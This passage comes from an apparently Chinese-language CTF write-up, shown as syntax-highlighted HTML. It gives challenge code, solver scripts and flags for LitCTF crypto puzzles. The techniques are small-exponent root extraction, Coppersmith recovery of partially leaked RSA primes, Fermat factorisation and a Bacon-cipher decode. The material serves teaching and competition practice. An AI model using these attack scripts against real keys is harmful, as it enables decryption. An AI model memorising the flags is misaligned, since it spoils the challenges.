number">22966360367971968504676737450654736559784526278126249100481690257360113645735823869174095070763996461165850039977914727245980242307319409983699793511352248209423007808171107239738771728438094641440444300596228692729277266556257088686585351869961921410859567001968798590921194402863219621666507877820378827092</span><span class="token punctuation">,</span> <span class="token number">41340655699032850811922590703534124397137469314819785476566566093858629648044627482514797174972386035722096563024583525376236045453451526570126890987183821072119586387364708099135124115856050119661380924186837677285512927400295146789034172166107474252827192261267643468495553148849468493009241668471083048430</span><span class="token punctuation">,</span> <span class="token number">52202475140977838262155766391763349770007617219731559882124842701306589259283233719727463105485402530682922793511867820592726412692298060420804847173813733441078903812811823520344962843237246635665635279928926476628971734748164894875272506105775963532397945641093931037074645811860105881221105902306255621181</span><span class="token punctuation">,</span> <span class="token number">43686732822375527268166781780704145014463398236959129237259540820318050928142217382482854923592727143517945840145245021402367171624497223470640246895897992745217804594441620139099576901221773322604374681094586004810027213343123533228000473640015954168594863999625384697827658129618656763377267113765657637761</span><span class="token punctuation">,</span> <span class="token number">14880134921930262144875287284818967110251827510945998306349834095556559727134453367023956672529927521400098332845397865476485851088348289863395304436600667602897364946074198944367059280853856523321854848231173098875824362694147164421785094924944589659224105370845089374193840009119763660625714201229551202464</span><span class="token punctuation">,</span> <span class="token number">38013516229906731040770728995532120131491416592495253746823605701526767788760134027460299370090486775327164899231056232048607749748639052414737842983659937901990208411978548025212907210373477389757182408450834322391767748006090559771843058148102090701817180898022507797050605846546948706282805015074193093273</span><span class="token punctuation">,</span> <span class="token number">20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220</span><span class="token punctuation">,</span> <span class="token number">20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220</span><span class="token punctuation">,</span> <span class="token number">20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220</span><span class="token punctuation">,</span> <span class="token number">38013516229906731040770728995532120131491416592495253746823605701526767788760134027460299370090486775327164899231056232048607749748639052414737842983659937901990208411978548025212907210373477389757182408450834322391767748006090559771843058148102090701817180898022507797050605846546948706282805015074193093273</span><span class="token punctuation">,</span> <span class="token number">16822859827241912092903301050602204948222809037868347721306013629185546078070142612905867911365364682095817701589155688149474870521437581822944710801232554186762524645518382246152771387652373860849924256464746937608068511622557828364043958392814895625329426982855829366086732912276996321034036018819408951193</span><span class="token punctuation">,</span> <span class="token number">34150153608686108981107806839997156875358767651869050480811448846242725270615327530663889984779854553092120823194108656627949475159285700946138204912775266363022036292515155178325852957375486496328282381365286611916449049601323101141237331480034977207188953388238873934117345088291003788988627587000440491067</span><span class="token punctuation">,</span> <span class="token number">1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567</span><span class="token punctuation">,</span> <span class="token number">1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567</span><span class="token punctuation">,</span> <span class="token number">43686732822375527268166781780704145014463398236959129237259540820318050928142217382482854923592727143517945840145245021402367171624497223470640246895897992745217804594441620139099576901221773322604374681094586004810027213343123533228000473640015954168594863999625384697827658129618656763377267113765657637761</span><span class="token punctuation">,</span> <span class="token number">1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567</span><span class="token punctuation">,</span> <span class="token number">2261213433462723419446068536636649771187144868712624195878985258332075459437123191546644392841202030016957753759317962427017329871785225346154355535823733243490439256337121075737014302820285880854932463336983215343814901470468271086180806826828758278636642722717746069806141466423669570629896086040252059811</span><span class="token punctuation">,</span> <span class="token number">2261213433462723419446068536636649771187144868712624195878985258332075459437123191546644392841202030016957753759317962427017329871785225346154355535823733243490439256337121075737014302820285880854932463336983215343814901470468271086180806826828758278636642722717746069806141466423669570629896086040252059811</span><span class="token punctuation">,</span> <span class="token number">20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220</span><span class="token punctuation">,</span> <span class="token number">1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567</span><span class="token punctuation">,</span> <span class="token number">34150153608686108981107806839997156875358767651869050480811448846242725270615327530663889984779854553092120823194108656627949475159285700946138204912775266363022036292515155178325852957375486496328282381365286611916449049601323101141237331480034977207188953388238873934117345088291003788988627587000440491067</span><span class="token punctuation">,</span> <span class="token number">22966360367971968504676737450654736559784526278126249100481690257360113645735823869174095070763996461165850039977914727245980242307319409983699793511352248209423007808171107239738771728438094641440444300596228692729277266556257088686585351869961921410859567001968798590921194402863219621666507877820378827092</span><span class="token punctuation">,</span> <span class="token number">16264894348259769136675550067824857283471919750028043029657185995447205515644739721442713128709898468504029150415861841382906641476195752925950909219618894837821015850329001463680764039265007095540240515692665160125015606879662459432975652875535648068534926380848491577719631224890161757880802939228883185592</span><span class="token punctuation">,</span> <span class="token number">1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567</span><span class="token punctuation">,</span> <span class="token number">48082751893707411443030173186335305790867819509239136633531599952276619514671134605545456992422479102909480454270136006149473478156585782252929384235054442854349205489546634520955838888639404324251978615664175676633161271815457282615312198983401493084973690137353747061078161134872098033066383487860152411239</span><span class="token punctuation">,</span> <span class="token number">21327622441108572162106669889096334171915319598231314927862632695081879818457106233577588661109578343720589743198154707810708496736138963401446774648179328773413409171869828838434037907816132436438314483017142493175451372700989061258496056410836951234155583628787251073520843683698565432474522538486905480145</span><span class="token punctuation">,</span> <span class="token number">2261213433462723419446068536636649771187144868712624195878985258332075459437123191546644392841202030016957753759317962427017329871785225346154355535823733243490439256337121075737014302820285880854932463336983215343814901470468271086180806826828758278636642722717746069806141466423669570629896086040252059811</span><span class="token punctuation">,</span> <span class="token number">21327622441108572162106669889096334171915319598231314927862632695081879818457106233577588661109578343720589743198154707810708496736138963401446774648179328773413409171869828838434037907816132436438314483017142493175451372700989061258496056410836951234155583628787251073520843683698565432474522538486905480145</span><span class="token punctuation">,</span> <span class="token number">16264894348259769136675550067824857283471919750028043029657185995447205515644739721442713128709898468504029150415861841382906641476195752925950909219618894837821015850329001463680764039265007095540240515692665160125015606879662459432975652875535648068534926380848491577719631224890161757880802939228883185592</span><span class="token punctuation">,</span> <span class="token number">43686732822375527268166781780704145014463398236959129237259540820318050928142217382482854923592727143517945840145245021402367171624497223470640246895897992745217804594441620139099576901221773322604374681094586004810027213343123533228000473640015954168594863999625384697827658129618656763377267113765657637761</span><span class="token punctuation">,</span> <span class="token number">52202475140977838262155766391763349770007617219731559882124842701306589259283233719727463105485402530682922793511867820592726412692298060420804847173813733441078903812811823520344962843237246635665635279928926476628971734748164894875272506105775963532397945641093931037074645811860105881221105902306255621181</span><span class="token punctuation">,</span> <span class="token number">6095619509559019908019352298785640301209234881314970774184941172547625244370412202107112133779358742353812823865176363562807708451451147505179327450732451736668872375390442553984797239930526165727742801338607942940231944774202087146668342653834800543503935286187760190753179319613671205950833349955049912928</span><span class="token punctuation">]</span>

e <span class="token operator">=</span> <span class="token number">9897777</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">==</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span>j
            
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># LitCTF&#123;f9fab7522253e44b48824e914d0801ba&#125;</span></code></pre>
<h3 id="CRT-plus"><a href="#CRT-plus" class="headerlink" title="CRT_plus"></a>CRT_plus</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> random
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">5</span>
A <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">]</span>
B <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">]</span>

C <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
N <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> p <span class="token operator">*</span> q
    c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> m <span class="token operator">+</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    N<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    C<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'A = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>A<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'B = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>B<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'C = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>C<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'N = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>N<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
A = [126, 48, 16, 72, 118]
B = [1015, 838, 454, 322, 287]
C = [1722078835760061914922188136968375167560877120158977673683182787526616054111469302309902289765296385972742778009222122528552899918863724377732557219671176645494150005867610261347026235782564913243945601412744385129580128250927608122522809099383488427292064494983097644976239331574095708707385594044914760001270147206289650087166888037423932397555572816680601347885645487184528254070549733484985825517047949, 13816768804244975535171696506080461156723308623701857620869448033158865282990045039961844920570143914665135883585879971811381020721992222246426401777511507400191713087571687956741206708710177012785421375718708189812774837594504418965920334982224317114403682678639035989628947049770826058014589194158740309041792753136519168749545398774774914316098342278282514631042388857128856143795589244785052399900000, 56859130881666565988360890971524531509149418204534393501520362276373931205720700726887545491289205478830425585724997174504028201171321308151273876050431857688549262391131233843813896378551007208009894797843649952348922113315189777325469148719163919686766128489229222919487894298991061288984198998019515140204032611992635303660051083035992783953034672470253917987745130941338091497821670180651626339168, 104921088107235282970210070343048501908867624861235981308477371001800133242704884555685815497516836051050046856653001827861416954490565731163497396533369953441870506739608750779206146960512840685327369132438186520936819912160558465866281258814185277348673235724471278843834900077063632942847769939844998491486539844971328759014099887125592504524703425638600458022082133169071492523661735192162844062500000, 1240538766092673389922062748316424702468324581791216732649676526936727204257919336267729115874238837779394913573904392250443112978081341477867371036538324777176210745189240390306682663050771398816977024467405187435749941354366210128964797433232968555682642062707794521268832699429918162047270351881018092211816812850558073282348521389449478019560248801682472510717226707312809024869529183888321461953350349]
N = [14928238039315040991308196203361315232720657103650133916768377003541186379974554794073142343542962199646167766317056723028716081533473830944328192280890558488982087259502304749351712886702680690273779927046689225691188145463409018705371701817782500722503682956161406169576545370923150575960593215241955617811801884711743303725010992704344613814422803869554915295599263200818169122460109761202619658976615539515461554999589496432809489233653847835884852838383631155057809145366161488972716470542997257824927235683738259840332405831579098429903716774910463581929154318403690419160948134710111693142307975784807557693379, 17942112047893516394059758069789896767008729052700255916941606468451353356755128052549675888464470730751071560385587733542652063605624887715486701968268746511130513891808360080569152819964870126967139166330069938033479674849483747008363844616001579775106124746396822730393977795887093285171120310391388533993105150552272708636765519928941755740285542436495225661570621438914992974707276930502069303295274628661481998308554649392508786793750053053121122238628064635273635766848165401929854140867543074809148318281653184460226317939677515071700168976030351545593059026392022012671316065525702115657483566938137244340943, 13019064216900979539288062154033407362873923068007793252861690841339799064052996489313924024470974905381895275618151217852919855409876807710907317767656306172828545362002202523070939278046699936212402230630256584670423362708987878505483680635512219997968954116231217398227993622065902156246475702094095500711503286622519913896122591961739665723628435538946933843825335162611709476594363043466396457232612767777259192378480905334359054208794766852953721503794850664015006289392327541583330272689875846792533484323373077869253786846989723423921359499060297185946499178827913630078855649725924366889102773642897486126623, 13912864686675639249288437589107116555604805004189183711379789929568272769079461241751272015747660238880020581115276925307650817840052731478197935494922776778456671398757225456564763063323400586339819575338030773839261766332062362334879207190483699972215128979606986002814161594101693635881349015199185085412611407662604627479103847204950489715963432100704956918420774156334247252954925845191282729254577898318969430816941295140050362250629162902319950857410371021670404067789437944207703037460999816188314289887032825758140831028148890807643175098513541476223379383684271681907330269037209677032315558402937931625967, 20697281700165158060712321641266488711894944770894967058614284974230824937584669196933970375321828545024565840884072714039625672397255154291241299830226044184343634190191714207346083253113281433886226024581215292220163243496877738571331530557698633431609877271753876915587472086166892247529345031622448967841394311132707519133169502656041602524428786054667737910711240877755895057344274733837936106880244101397045580919605270516952216181028018300911277852780391514223551138578229868751099931303779985263212375714318776700627534091244790507276964260243653855487575165560179621639549449819991732450911014479975009486773]
'''</span></code></pre>
<p>发现e过小，n过大，c可以直接开5次方求出m，应该是非预期</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2

c<span class="token operator">=</span><span class="token number">1722078835760061914922188136968375167560877120158977673683182787526616054111469302309902289765296385972742778009222122528552899918863724377732557219671176645494150005867610261347026235782564913243945601412744385129580128250927608122522809099383488427292064494983097644976239331574095708707385594044914760001270147206289650087166888037423932397555572816680601347885645487184528254070549733484985825517047949</span>
n<span class="token operator">=</span><span class="token number">14928238039315040991308196203361315232720657103650133916768377003541186379974554794073142343542962199646167766317056723028716081533473830944328192280890558488982087259502304749351712886702680690273779927046689225691188145463409018705371701817782500722503682956161406169576545370923150575960593215241955617811801884711743303725010992704344613814422803869554915295599263200818169122460109761202619658976615539515461554999589496432809489233653847835884852838383631155057809145366161488972716470542997257824927235683738259840332405831579098429903716774910463581929154318403690419160948134710111693142307975784807557693379</span>
t<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1015</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;Y0u_know_broadca5t_att4ck&#125;</span></code></pre>
<h3 id="男人，什么罐头我说！"><a href="#男人，什么罐头我说！" class="headerlink" title="男人，什么罐头我说！"></a>男人，什么罐头我说！</h3><pre class="language-none"><code class="language-none">00001010 00110000 00110001 00110000 00110001 00110001 00100000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00100000 00110001 00110000 00110001 00110000 00110000 00100000 00110000 00110000 00110001 00110001 00110001 00100000 00110000 00110000 00110000 00110000 00110000 00100000 00110001 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110000 00110001 00110000 00100000 00110000 00110000 00110000 00110000 00110000 00100000 00110000 00110001 00110001 00110000 00110000 00100000 00110000 00110001 00110000 00110001 00110000 00100000 00110001 00110000 00110000 00110000 00110001 00100000 00110000 00110000 00110000 00110000 00110000 00100000 00110001 00110000 00110001 00110001 00110000</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/08/OJ968L.png" alt="OJ968L.png" loading="lazy"><br>01转AB解培根<br><img src="https://ooo.0x0.ooo/2024/06/08/OJ9wKj.png" alt="OJ9wKj.png" loading="lazy"><br>LitCTF{MANWHATCANLSAY}</p>
<h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> enc <span class="token keyword">import</span> flag
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2


m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
leak1 <span class="token operator">=</span> p<span class="token operator">>></span><span class="token number">924</span>
leak2 <span class="token operator">=</span> p<span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>leak1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>leak2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
n = 10912724749357317040117295175340915836309117326481842971911576002816136982982366412133127436929465794389631046998036509363047557873155846920275327196471118680559431161116535588318645353317739214770132790445807395653916337747136630775427171105596048281228718048314706544665819996610453587925745842345926654572410324847927833437471701176403031302117052425160845583678182335391697596801106017558494065612842298945201720733418994561321697012416704574891516720606917736854915347853341353358814869449590841870866128113400765492223847582506991200050368263722438854522124807397499067048911261448546634778788867555039834459211
e = 65537
c = 6991017300002465473760665517672638980904771950587963320768028786572848880002446111427309844155944419991711131609525886799710433964716773503883581910737560542905952516670539044167012461107915291519628081744473505479068712979401023972013124089857993361492602682730769445826818873805246777789559501477084603991595919524098203387452563401306823917989080019788620521432596833764004972429814705900915782768111621466120683534147560628509733828773006451505153520893053368254310905682981931980175859011116643271531341395883753605992130701423800808678200033639094180802506618083869818685981234182334150817211223363755511509799
leak1 = 749278395841748263310980933893
leak2 = 2675756732628494397256285826768672620995252274010849868485475743575097846941007603037228233621038664628877573057336866559545388148568450491606789423985
'''</span></code></pre>
<p>p高位和低位泄露</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
leak1 <span class="token operator">=</span> <span class="token number">749278395841748263310980933893</span>
leak2 <span class="token operator">=</span> <span class="token number">2675756732628494397256285826768672620995252274010849868485475743575097846941007603037228233621038664628877573057336866559545388148568450491606789423985</span>
n <span class="token operator">=</span> <span class="token number">10912724749357317040117295175340915836309117326481842971911576002816136982982366412133127436929465794389631046998036509363047557873155846920275327196471118680559431161116535588318645353317739214770132790445807395653916337747136630775427171105596048281228718048314706544665819996610453587925745842345926654572410324847927833437471701176403031302117052425160845583678182335391697596801106017558494065612842298945201720733418994561321697012416704574891516720606917736854915347853341353358814869449590841870866128113400765492223847582506991200050368263722438854522124807397499067048911261448546634778788867555039834459211</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token number">6991017300002465473760665517672638980904771950587963320768028786572848880002446111427309844155944419991711131609525886799710433964716773503883581910737560542905952516670539044167012461107915291519628081744473505479068712979401023972013124089857993361492602682730769445826818873805246777789559501477084603991595919524098203387452563401306823917989080019788620521432596833764004972429814705900915782768111621466120683534147560628509733828773006451505153520893053368254310905682981931980175859011116643271531341395883753605992130701423800808678200033639094180802506618083869818685981234182334150817211223363755511509799</span>

p_high<span class="token operator">=</span>leak1<span class="token operator">&lt;&lt;</span><span class="token number">924</span>
p_low<span class="token operator">=</span>leak2
R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> p_high <span class="token operator">+</span> x<span class="token operator">*</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">500</span> <span class="token operator">+</span> p_low
f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
res<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">424</span><span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> root <span class="token keyword">in</span> res<span class="token punctuation">:</span>
    p <span class="token operator">=</span> p_high <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">500</span> <span class="token operator">+</span> p_low
    q <span class="token operator">=</span> n <span class="token operator">//</span> p
    d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># LitCTF&#123;3b633bcc134c1d0f5c07ea7873f91c26&#125;</span></code></pre>
<h3 id="little-fermat-plus"><a href="#little-fermat-plus" class="headerlink" title="little_fermat_plus"></a>little_fermat_plus</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>gen_x

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">65537</span>
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> nextprime<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q

x <span class="token operator">=</span> gen_x<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token keyword">assert</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">666666</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">**</span> <span class="token number">1024</span>

m <span class="token operator">=</span> m <span class="token operator">^</span> x
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
n = 169522900072954416356051647146585827691225327527086797334523482640452305793443986277933900273961829438217255938808371865341750200444086653241610669340348513884285892043530862971785487294831341653909852543469963032532560079879299447677636753647721541724969084825510405349373420839032990681851700075554428485967
c = 105943762023156641770119141175498496686312095002592803768522760959533958364969985856505466722378959991757667341747887520146437729810252085791886309974903778546814812093444837674447485802109225767800488527376777153844313243366001288246744190001997192598159277512188417272938455513900277907186067996704043274199
'''</span></code></pre>
<p>根据费马小定理知道x&#x3D;1024*(p-1)<br>先费马分解得到p,q,求出m在于x异或</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">def</span> <span class="token function">fermat</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> x <span class="token operator">*</span> x <span class="token operator">&lt;</span> num<span class="token punctuation">:</span>
        x <span class="token operator">+=</span> <span class="token number">1</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        y2 <span class="token operator">=</span> x <span class="token operator">*</span> x <span class="token operator">-</span> num
